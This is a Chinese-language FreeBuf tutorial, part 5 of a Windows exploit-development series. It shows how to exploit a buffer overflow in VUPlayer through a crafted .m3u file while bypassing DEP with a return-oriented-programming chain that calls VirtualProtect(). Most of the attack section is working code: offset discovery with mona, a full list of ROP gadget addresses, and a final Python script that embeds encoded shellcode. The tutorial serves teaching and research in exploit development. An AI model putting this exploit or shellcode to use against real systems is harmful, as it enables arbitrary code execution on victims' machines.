@@ -1,0 +1,397 @@
+*** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+
+![Windows漏洞利用开发教程 Part
+5：返回导向编程\(ROP\)](https://image.3001.net/images/20180601/15278364252290.jpg!small)
+
+## 一、前言
+
+漏洞——信息安全界最常见的词汇，在百度百科是这样描述的：
+
+> 漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。
+
+**本文主要介绍的是Windows软件漏洞的利用开发教程。我花了大量的时间来研究了计算机安全领域Windows漏洞利用开发，希望能和大家分享一下，能帮助到对这方面感兴趣的朋友，如有不足，还请见谅。**
+
+前文回顾
+
+> [Windows漏洞利用开发教程Part 1](http://www.freebuf.com/articles/system/166500.html)
+>
+> [Windows漏洞利用开发教程Part 2：Short
+> Jump](http://www.freebuf.com/articles/system/167959.html)
+>
+> [Windows漏洞利用开发教程Part
+> 3：Egghunter](http://www.freebuf.com/articles/system/169167.html)
+>
+> [Windows漏洞利用开发教程 Part
+> 4：SEH](http://www.freebuf.com/articles/system/170703.html)
+
+## 二、准备阶段
+
+欢迎来到Windows漏洞利用开发的第五篇文章，今天我们将讨论一种返回导向编程(ROP)技术，该技术通常用于解决被称为数据执行保护（DEP）的安全措施。DEP是数据执行保护的英文缩写，全称为Data
+Execution Prevention。数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在系统上运行恶意代码。
+
+到目前为止，我们一直在使用Windows
+XP系统环境来学习如何攻击具有较少安全机制的操作系统。经过前面的几篇文章，我们是时候换一套新的系统环境啦，对于本教程，我们将使用Windows 7系统环境。
+
+接下来我们再次在虚拟机中安装Immunity Debugger，Python和mona.py。详情请看第一篇文章。
+
+准备就绪后我们开始学习ROP，目标软件是VUPlayer，查看漏洞详情或下载存在漏洞的软件请看下述链接：
+
+    
+    
+    https://www.exploit-db.com/exploits/40018/
+    
+
+在开始之前，我们还需要确保Windows 7虚拟机的DEP已打开。
+
+打开控制面板，系统和安全->系统，然后点击高级系统设置
+
+![15278364348769.png!small](https://image.3001.net/images/20180601/15278364348769.png!small)
+
+点击设置，设置数据执行保护为下图所示
+
+![1527836439446.png!small](https://image.3001.net/images/20180601/1527836439446.png!small)
+
+## 三、漏洞利用开发分析
+
+开始和之前是差不多的步骤，这也是漏洞利用开发必不可少的步骤，所以我们不再做详细介绍了，只是大致演示一下怎么分析获取到一些必需的数据。
+
+### 确认漏洞
+
+首先我们肯定需要编写一个脚本来生成payload测试漏洞，这个漏洞在之前文章有介绍过。
+
+    
+    
+    payload = 3000 * "A"
+    file = open('test.m3u','w')
+    file.write(payload)
+    file.close
+    
+
+我们是怎么简单怎么来，主要生成一个3000字符的测试文件test.m3u
+
+使用Immunity Debugger打开软件VUPlayer.exe，在打开的对话框中点击file-openplaylist打开测试文件test.m3u或者将测试文件test.m3u拖拽到VUPlayer对话框，可以发现EIP被A字符串覆盖。
+
+![15278364441127.png!small](https://image.3001.net/images/20180601/15278364441127.png!small)
+
+### EIP offset
+
+接下来就是寻找EIP的偏移量，很简单，我们使用mona来寻找
+
+生成测试字符：
+
+    
+    
+    !mona pc 3000
+    
+
+继续上面步骤后，查看EIP被覆盖的值
+
+![15278364493481.png!small](https://image.3001.net/images/20180601/15278364493481.png!small)
+
+使用mona找到偏移量1012
+
+    
+    
+    !mona po 0x68423768
+    
+
+![15278364538157.png!small](https://image.3001.net/images/20180601/15278364538157.png!small)
+
+### JMP ESP
+
+接下来就寻找一个JMP ESP，为什么要寻找它，前面也介绍过了，通过将EIP覆盖为它的地址跳出这样就可以非常方便的布局堆栈，确保shellcode顺利执行。
+
+寻找JMP ESP的mona指令大家还记得吧
+
+    
+    
+    !mona jmp -r esp
+    
+
+这样我们就得到了EIP要覆盖的地址0x1010539f
+
+![15278364582356.png!small](https://image.3001.net/images/20180601/15278364582356.png!small)
+
+### 测试代码
+
+现在可以加入模拟shellcode来测试一下是否会顺利执行shellcode
+
+    
+    
+    # -*- coding: UTF-8 -*- 
+    import struct
+    
+    total_num = 3000  #构建的payload大小，主要确保成功溢出
+    junk = "\x41" * 1012                #偏移
+    eip = struct.pack('<L',0x1010539f)    #EIP
+    nops = "\x90"*16                     #NOP
+    # 模拟shellcode
+    shellcode = "\xCC" * 100
+    # 拼接exploit
+    exploit = junk + eip + nops + shellcode
+    fill = "\x43" * (total_num - len(exploit))
+    # 拼接payload
+    payload = exploit + fill
+    # 创建文件
+    file = open('test.m3u','w')
+    file.write(payload)
+    file.close()
+    
+
+使用Immunity Debugger打开软件VUPlayer.exe，在打开的对话框中点击file-openplaylist打开测试文件test.m3u或者将测试文件test.m3u拖拽到VUPlayer对话框
+
+![15278364659407.png!small](https://image.3001.net/images/20180601/15278364659407.png!small)
+
+你可以发现我们的shellcode并没有执行，如果继续下去程序就会崩溃，这是因为数据执行保护（DEP）阻止了我们shellcode的执行从而导致了程序的崩溃。但是，我们发现JMP
+ESP是执行了，所以说我们可以执行一些代码，但这条代码必须是现有的，就像我们之前可以运行的JMP
+ESP一样，它存在被允许执行的代码段中。这也正是ROP技术的关键所在。
+
+## 四、ROP分析及构建
+
+现在我们来看一下问题的核心是什么，DEP阻止了操作系统将我们的0xCC解释为INT指令，而不是它不知道0xCC是什么东西。如果没有DEP，操作系统就会知道0xCC是个INT指令，然后继续执行这个指令。启用DEP后，某些内存段就会被标记为NON-EXECUTABLE
+(NX)，意思就是操作系统不会再将数据解释为指令。但是DEP没有说我们不能执行标记为可执行的现有程序指令，比如组成VUPlayer程序的代码，这在前面我们可以执行JMP
+ESP代码就可以看出了，因为该指令是在程序本身中找到的，被标记为可执行，因此程序可以运行。然而我们加入的shellcode是新的，所以它被放在了一个标记为不可执行的内存段。
+
+### ROP思想
+
+现在我们已经接触到ROP技术的核心了，就是一个面向返回编程技术。核心思想就是收集一些现有的程序汇编指令，这些指令没有被DEP标记为不可执行，然后将它们链接在一起，告诉操作系统让我们的shellcode区域可执行。
+
+我们收集的这些汇编指令被称为小配件（gadgets），这些小工具通常是一堆地址的形式，这些地址指向有用的汇编指令，然后是返回或RET指令，以开始执行链中的下一个小配件。这就是为什么它被称为面向返回编程。
+
+我们怎么才能将shellcode区域标记为可执行呢？在Windows操作有很多办法，本文我们将使用VirtualProtect()函数,想详细了解这个函数请看下述链接：
+
+    
+    
+    https://msdn.microsoft.com/en-us/library/windows/desktop/aa366898(v=vs.85).aspx
+    
+
+介绍完理论，现在我们就要来实战构建。
+
+### 构建ROP Chain
+
+首先，我们来看看想成功执行VirtualProtect()函数，需要哪些参数：
+
+    
+    
+    lpAddress：指向需要修改保护属性的页的基地址。所有的页必须在同一个函数 VirtualAlloc 或 VirtualAllocEx 调用使用 MEM_RESERVE 标记。页不可以跨越到临近的另一个以上两个函数使用 MEM_RESERVE 标记的页。
+    
+    dwSize：需改变保护属性的内存大小，单位为Bytes 。改变范围为 lpAddress 到（ lpAddress + dwSize ）。这意味着如果范围跨越了一个页界，那么页界两边的两个页的保护属性均会被改变。
+    
+    flNewProtect：内存保护属性常量（memory protection constants ）。对于那些已经有效的页，如果这个参数与函数 VirtualAlloc 或 VirrualAllocEx 的设置冲突，该参数将被忽略。
+    
+    lpflOldProtect：这个参数指向一个接受原保护属性的变量。如果该参数为NULL，则函数失败。
+    
+
+了解完参数，我们分析看看这些参数怎么设置，lpAddress参数肯定设置为我们shellcode，dwSize设置为0x201，flNewProtect设置为0x40（常数，具体看下述链接），最后设置lpflOldProtect为任何静态可写的位置。接下来调用我们刚刚设置的VirtualProtect()函数就行了。
+
+    
+    
+    flNewProtect内存保护常数列表：
+    https://msdn.microsoft.com/en-us/library/aa366786(v=VS.85).aspx
+    
+
+首先，让我们找到小配件来构建VirtualProtect()函数所需的参数,点击e来获取属于VUPlayer的可执行模块。
+
+![15278364737651.png!small](https://image.3001.net/images/20180601/15278364737651.png!small)
+
+要从我们选择的模块找到可用小配件列表，您可以在Mona中使用以下命令：
+
+    
+    
+    !mona rop -m "bass,basswma,bassmidi"
+    
+
+![1527836479645.png!small](https://image.3001.net/images/20180601/1527836479645.png!small)
+
+查看Mona生成的rop_suggestions.txt和rop.txt文件
+
+![1527836485432.png!small](https://image.3001.net/images/20180601/1527836485432.png!small)
+
+让我们来构建ROP chain
+
+首先，让我们出栈一个值到EBP中，后面调用PUSHAD:
+
+    
+    
+    0x10010157,  # POP EBP # RETN [BASS.dll]
+    0x10010157,  # skip 4 bytes [BASS.dll]
+    
+
+通过取反得到值0x201，然后将值放入到EBX寄存器，作为参数dwSize的值
+
+    
+    
+      0x10015f77,  # POP EAX # RETN [BASS.dll]
+      0xfffffdff,  # Value to negate, will become 0x00000201
+      0x10014db4,  # NEG EAX # RETN [BASS.dll]
+      0x10032f72,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll]
+    
+
+接下来，同样道理得到值0x40,然后将值放入到EDX寄存器,作为参数flNewProtect的值
+
+    
+    
+      0x10015f82,  # POP EAX # RETN [BASS.dll]
+      0xffffffc0,  # Value to negate, will become 0x00000040
+      0x10014db4,  # NEG EAX # RETN [BASS.dll]
+      0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll]
+    
+
+然后我们需要找到一个可写位置地址，然后将值放入寄存器ECX中，作为参数lpflOldProtect的值
+
+    
+    
+      0x101049ec,  # POP ECX # RETN [BASSWMA.dll]
+      0x101082db,  # &Writable location [BASSWMA.dll]
+    
+
+为了等下调用调用PUSHAD，我们将一些值放入到EDI和ESI寄存器中
+
+    
+    
+      0x1001621c,  # POP EDI # RETN [BASS.dll]
+      0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
+      0x10604154,  # POP ESI # RETN [BASSMIDI.dll]
+      0x10101c02,  # JMP [EAX] [BASSWMA.dll]
+    
+
+最后，我们放入函数VirtualProtect()的地址来进行调用，EAX寄存器的值就是0x1060e25c
+
+    
+    
+      0x10015fe7,  # POP EAX # RETN [BASS.dll]
+      0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
+    
+
+接下来就很简单了，将我们设置的VirtualProtect()的寄存器压入堆栈，直接用了PUSHAD和JMP ESP，PUSHAD压入堆栈，JMP
+ESP转到执行。
+
+    
+    
+      0x1001d7a5,  # PUSHAD # RETN [BASS.dll]
+      0x10022aa7,  # ptr to 'jmp esp' [BASS.dll]
+    
+
+PUSHAD将按以下顺序将寄存器值放在堆栈上:EAX、ECX、EDX、EBX、ESP, EBP, ESI，EDI。
+
+Python:
+
+    
+    
+    def create_rop_chain():
+    
+        rop_gadgets = [
+            0x10010157,  # POP EBP # RETN [BASS.dll]
+            0x10010157,  # skip 4 bytes [BASS.dll]
+            0x10015f77,  # POP EAX # RETN [BASS.dll]
+            0xfffffdff,  # Value to negate, will become 0x00000201
+            0x10014db4,  # NEG EAX # RETN [BASS.dll]
+            0x10032f72,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll]
+            0x10015f82,  # POP EAX # RETN [BASS.dll]
+              0xffffffc0,  # Value to negate, will become 0x00000040
+              0x10014db4,  # NEG EAX # RETN [BASS.dll]
+            0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll]
+            0x101049ec,  # POP ECX # RETN [BASSWMA.dll]
+            0x101082db,  # &Writable location [BASSWMA.dll]
+            0x1001621c,  # POP EDI # RETN [BASS.dll]
+            0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
+            0x10604154,  # POP ESI # RETN [BASSMIDI.dll]
+            0x10101c02,  # JMP [EAX] [BASSWMA.dll]
+            0x10015fe7,  # POP EAX # RETN [BASS.dll]
+            0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
+            0x1001d7a5,  # PUSHAD # RETN [BASS.dll]
+            0x10022aa7,  # ptr to 'jmp esp' [BASS.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+    
+
+## 五、漏洞利用开发实现
+
+再写脚本之前，我们要注意一下，现在我们要覆盖的EIP地址只需要跳转过去马上回来就行了，所以我们直接找个RETN指令地址就行啦。
+
+![Windows漏洞利用开发教程 Part
+5：返回导向编程\(ROP\)](https://image.3001.net/images/20180601/15278364943873.png!small)
+
+经过上面的分析，实现起来就很简单了，具体请看下面代码和注释：
+
+    
+    
+    # -*- coding: UTF-8 -*- 
+    import struct
+    # 构建ROP chain
+    def create_rop_chain():
+    
+        rop_gadgets = [
+            0x10010157,  # POP EBP # RETN [BASS.dll]
+            0x10010157,  # skip 4 bytes [BASS.dll]
+            0x10015f77,  # POP EAX # RETN [BASS.dll]
+            0xfffffdff,  # Value to negate, will become 0x00000201
+            0x10014db4,  # NEG EAX # RETN [BASS.dll]
+            0x10032f72,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll]
+            0x10015f82,  # POP EAX # RETN [BASS.dll]
+              0xffffffc0,  # Value to negate, will become 0x00000040
+              0x10014db4,  # NEG EAX # RETN [BASS.dll]
+            0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll]
+            0x101049ec,  # POP ECX # RETN [BASSWMA.dll]
+            0x101082db,  # &Writable location [BASSWMA.dll]
+            0x1001621c,  # POP EDI # RETN [BASS.dll]
+            0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
+            0x10604154,  # POP ESI # RETN [BASSMIDI.dll]
+            0x10101c02,  # JMP [EAX] [BASSWMA.dll]
+            0x10015fe7,  # POP EAX # RETN [BASS.dll]
+            0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll]
+            0x1001d7a5,  # PUSHAD # RETN [BASS.dll]
+            0x10022aa7,  # ptr to 'jmp esp' [BASS.dll]
+    ]
+    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
+    
+    total_num = 3000  #构建的payload大小，主要确保成功溢出
+    # 调用生成ROP Chain函数
+    rop_chain = create_rop_chain()
+    junk = "\x41" * 1012                #偏移
+    eip = struct.pack('<L',0x10601058)    #EIP
+    nops = "\x90"*16                     #NOP
+    # shellcode
+    shellcode = ("\xbb\xc7\x16\xe0\xde\xda\xcc\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
+    "\x33\x83\xc0\x04\x31\x58\x0e\x03\x9f\x18\x02\x2b\xe3\xcd\x4b"
+    "\xd4\x1b\x0e\x2c\x5c\xfe\x3f\x7e\x3a\x8b\x12\x4e\x48\xd9\x9e"
+    "\x25\x1c\xc9\x15\x4b\x89\xfe\x9e\xe6\xef\x31\x1e\xc7\x2f\x9d"
+    "\xdc\x49\xcc\xdf\x30\xaa\xed\x10\x45\xab\x2a\x4c\xa6\xf9\xe3"
+    "\x1b\x15\xee\x80\x59\xa6\x0f\x47\xd6\x96\x77\xe2\x28\x62\xc2"
+    "\xed\x78\xdb\x59\xa5\x60\x57\x05\x16\x91\xb4\x55\x6a\xd8\xb1"
+    "\xae\x18\xdb\x13\xff\xe1\xea\x5b\xac\xdf\xc3\x51\xac\x18\xe3"
+    "\x89\xdb\x52\x10\x37\xdc\xa0\x6b\xe3\x69\x35\xcb\x60\xc9\x9d"
+    "\xea\xa5\x8c\x56\xe0\x02\xda\x31\xe4\x95\x0f\x4a\x10\x1d\xae"
+    "\x9d\x91\x65\x95\x39\xfa\x3e\xb4\x18\xa6\x91\xc9\x7b\x0e\x4d"
+    "\x6c\xf7\xbc\x9a\x16\x5a\xaa\x5d\x9a\xe0\x93\x5e\xa4\xea\xb3"
+    "\x36\x95\x61\x5c\x40\x2a\xa0\x19\xbe\x60\xe9\x0b\x57\x2d\x7b"
+    "\x0e\x3a\xce\x51\x4c\x43\x4d\x50\x2c\xb0\x4d\x11\x29\xfc\xc9"
+    "\xc9\x43\x6d\xbc\xed\xf0\x8e\x95\x8d\x97\x1c\x75\x7c\x32\xa5"
+    "\x1c\x80")
+    # 拼接exploit
+    exploit = junk + eip + rop_chain + nops + shellcode
+    fill = "\x43" * (total_num - len(exploit))
+    # 拼接payload
+    payload = exploit + fill
+    # 创建文件
+    file = open('test.m3u','w')
+    file.write(payload)
+    file.close()
+    
+
+使用Immunity Debugger打开软件VUPlayer.exe，在打开的对话框中点击file-openplaylist打开测试文件test.m3u或者将测试文件test.m3u拖拽到VUPlayer对话框，shellcode成功执行。
+
+![Windows漏洞利用开发教程 Part
+5：返回导向编程\(ROP\)](https://image.3001.net/images/20180601/15278365016445.png!small)
+
+堆栈情况：
+
+![Windows漏洞利用开发教程 Part
+5：返回导向编程\(ROP\)](https://image.3001.net/images/20180601/15278365087919.png!small)
+
+## 六、总结
+
+使用!mona rop命令，在日志文件夹rop_chains.txt文件中也会自动生成一个完整的ROP chain，当然重点在于理解，如果自动生成的ROP
+chain在使用过程中出错，就需要自己慢慢去分析并修改一些东西了。有攻必有防，攻与防总是相对的，在这里感谢无私分享技术的安全研究人员，没有他们的分享就没有这篇文章。当然，我自认为自己了解还是太少了。还是那句话，本人水平有限，如有不足，还请各位兄弟指出。  
+*** 本文作者：zusheng，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+
